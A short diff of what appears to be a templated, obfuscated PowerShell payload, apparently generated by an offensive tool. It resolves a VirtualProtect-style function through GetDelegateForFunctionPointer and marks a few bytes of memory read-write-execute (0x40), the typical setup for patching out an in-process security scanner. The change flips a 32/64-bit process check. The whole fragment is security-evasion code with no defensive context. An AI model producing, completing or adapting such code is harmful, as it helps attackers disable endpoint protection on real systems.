@@ -164,7 +164,7 @@ $g = $g+$h
 $aaar = 0
 $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(({a} $d $e), ({b} @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
 
-if ([Environment]::Is64BitProcess -ne [Environment]::Is64BitOperatingSystem)
+if ([Environment]::Is64BitProcess -eq [Environment]::Is64BitOperatingSystem)
 {{
 [IntPtr]${f} = {a} $a $b
 $vp.Invoke(${f}, 3, 0x40, [ref]$aaar)
